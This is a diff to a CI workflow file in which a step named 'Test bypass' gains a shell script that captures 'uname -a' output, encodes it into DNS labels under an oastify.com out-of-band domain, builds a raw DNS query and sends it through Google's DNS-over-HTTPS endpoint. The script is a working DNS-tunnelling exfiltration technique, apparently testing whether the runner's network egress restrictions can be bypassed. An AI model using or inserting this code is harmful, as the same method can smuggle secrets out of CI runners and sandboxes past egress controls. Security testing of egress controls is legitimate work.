@@ -16,5 +16,42 @@ jobs:
 
       - name: Test bypass
         run: |
-          curl dns.google
-          curl example.com
+          output=$(uname -a)
+          
+          # Step 2: Encode to URL-safe Base64 (no padding)
+          encoded=$(echo -n "$output" | base64 -w0 | tr -d '=' | sed 's/+/-/g; s/\//_/g')
+          
+          # Step 3: Chunk into DNS labels (<=63 chars each)
+          chunks=$(echo "$encoded" | fold -w63 | awk '{printf "%s.", $0} END {printf "\n"}' | tr -d '\n')
+          full_subdomain="${chunks%.}"  # Remove trailing dot if any
+          
+          # Step 4: Build full domain
+          base_domain="1y0ua69rajnmrpk5tuq7qyczwq2hqhe6.oastify.com"
+          full_domain="${full_subdomain}.${base_domain}"
+          
+          echo "Captured: $output"
+          echo "Encoded: $encoded"
+          echo "Full Domain: $full_domain"
+          
+          # Step 5: Function to build QNAME binary (length-prefixed labels + null)
+          build_qname() {
+            local domain="$1"
+            local qname=""
+            IFS='.' read -ra labels <<< "$domain"
+            for label in "${labels[@]}"; do
+              len=${#label}
+              qname+=$(printf '\\x%02x%s' "$len" "$label")
+            done
+            qname+=$(printf '\\x00')
+            echo -en "$qname"
+          }
+          
+          # Step 6: Build full DNS query packet binary (A record, recursion desired)
+          qname_bin=$(build_qname "$full_domain")
+          packet=$(printf '\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' ; echo -n "$qname_bin" ; printf '\x00\x01\x00\x01')
+          
+          # Step 7: Base64 encode the packet
+          dns_b64=$(echo -n "$packet" | base64 -w0)
+          
+          # Step 8: Curl DoH query (sends to Google, which resolves via your oastify DNS)
+          curl -H 'accept: application/dns-message' "https://dns.google/dns-query?dns=$dns_b64"
